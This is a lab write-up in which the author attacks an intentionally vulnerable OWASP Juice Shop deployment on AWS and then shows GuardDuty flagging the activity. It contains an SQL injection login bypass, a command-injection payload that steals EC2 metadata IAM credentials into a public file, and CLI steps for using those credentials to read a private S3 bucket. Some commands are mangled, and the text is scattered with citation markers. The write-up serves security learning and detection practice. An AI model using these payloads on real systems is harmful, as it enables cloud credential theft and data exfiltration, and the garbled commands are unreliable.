# [cite_start]Threat Detection using AWS GuardDuty [cite: 654]
[cite_start]By: Joneil lan Morano [cite: 654]

## Summary
[cite_start]This mini-project demonstrates practical knowledge and hands-on experience in spotting and exploiting web vulnerabilities and using AWS GuardDuty to detect and analyze threats. [cite: 656] [cite_start]With this, we will deploy a vulnerable web application (OWASP Juice Shop) on purpose, use offensive techniques to steal credentials and sensitive data from an AWS EC2 instance, and detect and analyze these attacks using GuardDuty. [cite: 657] [cite_start]At the end of this project, an extension for implementing malware protection on AWS resources will also be demonstrated. [cite: 658]

## Architecture and Tech Stack
[cite_start]The infrastructure relies on different resources across three main categories: compute, storage, and networking. [cite: 660]
* [cite_start]Services Used: Amazon GuardDuty, Amazon CloudFront, Amazon S3, AWS CloudFormation, and the OWASP Juice Shop. [cite: 661]
* [cite_start]Networking: The setup includes a VPC, Subnets, Security Groups, an Internet Gateway, Route Tables, and VPC Endpoints. [cite: 662]

## Overview

[cite_start]![Process of the Project](images/process-of-the-project.png) [cite: 664, 671]

[cite_start]**Process of the Project** [cite: 671]
* [cite_start]Phase 1: Infrastructure Deployment [cite: 672]
* [cite_start]Phase 2: Offensive Operations [cite: 673]
* [cite_start]Phase 3: Defensive Operations [cite: 674]

---

## [cite_start]Phase 1: Infrastructure Deployment [cite: 675]

[cite_start]![Infrastructure Diagram](images/infrastructure-diagram.png) [cite: 676, 684]

[cite_start]To simulate a real-world environment, the infrastructure was deployed using Infrastructure as Code (laC). [cite: 685] [cite_start]Since threat detection using GuardDuty is the main goal of this project, we will not go into detail on how to use the CloudFormation template (YAML or JSON file) in AWS. [cite: 686]

1. [cite_start]A CloudFormation template was launched to deploy the OWASP Juice Shop web application. [cite: 687] [cite_start]Deploying the environment via CloudFormation allowed for immediate testing of the application's security posture. [cite: 688]

[cite_start]![CloudFormation Deployment](images/cloudformation-deployment.png) [cite: 689, 713]

2. [cite_start]We can then access the web application through the output link of our cloud deployment. [cite: 719]

[cite_start]![CloudFormation Outputs](images/cloudformation-outputs.png) [cite: 720, 753]

3. [cite_start]This CloudFormation template also deploys an S3 bucket for storage. [cite: 754] [cite_start]This bucket will then store a file named important-information.txt, which is meant to simulate sensitive data. [cite: 755] [cite_start]Later, we're going to access this file and read its contents by performing a data breach. [cite: 756]

---

## [cite_start]Phase 2: Offensive Operations [cite: 757]

### [cite_start]1. SQL Injection (Authentication Bypass) [cite: 758]
[cite_start]The first phase of the attack targeted the application's login mechanism. [cite: 759] [cite_start]By manipulating the SQL query used for login, the authentication check was bypassed. [cite: 760]

[cite_start]![SQL Injection Login](images/SQL-injection.png) [cite: 761, 768]

[cite_start]The payload ' or 1=1;-- was entered into the email field, forcing the database query to evaluate to true. [cite: 769, 770]

[cite_start]![Authentication Bypassed](images/authentication-bypassed.png) [cite: 771, 779]

### [cite_start]2. Command Injection and Credential Exfiltration [cite: 780]
[cite_start]Following the initial breach, the objective shifted to exfiltrating cloud environment credentials. [cite: 781] [cite_start]A JavaScript payload was executed within the application's user profile username field. [cite: 782] [cite_start]The script accessed the EC2 instance metadata service to retrieve a session token and IAM credentials. [cite: 783]

```javascript
#{global.process.mainModule.require('child_process').exec(
'CREDURL=[http://169.254.169.254/latest/meta-data/iam/security-credentials/](http://169.254.169.254/latest/meta-data/iam/security-credentials/);
TOKEN= curl -X PUT "[http://169.254.169.254/latest/api/token](http://169.254.169.254/latest/api/token)" -H
"X-aws-ec2-metadata-token-ttl-seconds: 21600" &&
CRED=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s $CREDURL |
echo $CREDURL$(cat) | xargs -n1 curl -H "X-aws-ec2-metadata-token: $TOKEN") &&
echo $CRED | json_pp >frontend/dist/frontend/assets/public/credentials.json')}
[cite_start]``` [cite: 785, 786, 787, 788, 789, 790]

[cite_start]![Command Injection](images/username-field.png) [cite: 791, 795]

[cite_start]These stolen credentials were then saved to a public JSON file (/assets/public/credentials.json), making them accessible over the internet. [cite: 796]

[cite_start]![Stolen Credentials](images/stolen-credentials.png) [cite: 797, 809]

### [cite_start]3. Data Theft via AWS CloudShell [cite: 810]
[cite_start]Using the compromised IAM credentials, the attack was escalated to access secure cloud storage [cite: 811, 812]

[cite_start]![CloudShell Data Theft](images/cloudshell-1.png) [cite: 813, 843]

[cite_start]![CloudShell Data Theft](images/cloudshell-2.png) [cite: 844, 874]


[cite_start]AWS CloudShell was utilized to configure a new CLI profile using the stolen AccessKeyld and SecretAccessKey. [cite: 874, 875]

```bash
$aws configure set profile.stolen.region ap-southeast-1$ aws configure set profile.stolen.aws_access_key_id cat credentials.json | jq-r.AccessKeyId'
$aws configure set profile.stolen.aws_secret_access_key cat credentials.json | jqr.SecretAccessKey"$ aws configure set profile.stolen.aws_session_token cat credentials.json | jqr.Token"
[cite_start]``` [cite: 876, 877, 878, 879]

[cite_start]The attacker profile successfully accessed a secure S3 bucket and downloaded a file named secret-information.txt, completing the data exfiltration objective. [cite: 880, 881]

```bash
~$ cat secret-information.txt
Dang it if you can see this text, you're accessing our private information!
[cite_start]``` [cite: 882, 883]

---

## [cite_start]Phase 3: Defensive Operations [cite: 884]
[cite_start]With the attacks executed, the focus shifted to analyzing the environment's automated threat detection capabilities. [cite: 885]

1. [cite_start]AWS GuardDuty successfully detected the unauthorized activity and generated a high-severity finding. [cite: 886]

[cite_start]![GuardDuty Findings](images/guardduty-1.png) [cite: 887, 911]

[cite_start]The finding, categorized as an unauthorized use of EC2 instance credentials from a remote AWS account, identified the exact role (GuardDuty-project-lan-TheRole-JYRr30gc5FV0) that was compromised. [cite: 912, 913]

[cite_start]![GuardDuty Detailed Finding](images/guardduty-results.png) [cite: 914, 915]
